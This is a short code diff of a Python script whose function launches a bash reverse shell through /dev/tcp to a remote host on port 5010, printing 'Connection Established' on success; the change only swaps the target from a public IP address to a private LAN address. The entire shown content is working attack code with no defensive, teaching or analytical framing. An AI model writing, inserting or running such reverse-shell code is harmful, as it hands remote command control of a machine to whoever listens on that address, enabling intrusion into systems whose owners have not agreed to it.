@@ -4,7 +4,7 @@ import threading
 
 def fn(n):
     try:
-        subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/5010 0<&1 2>&1", shell=True, executable="/bin/bash")
+        subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.51/5010 0<&1 2>&1", shell=True, executable="/bin/bash")
         print("Connection Established")
     except:
         print("Command Failed")
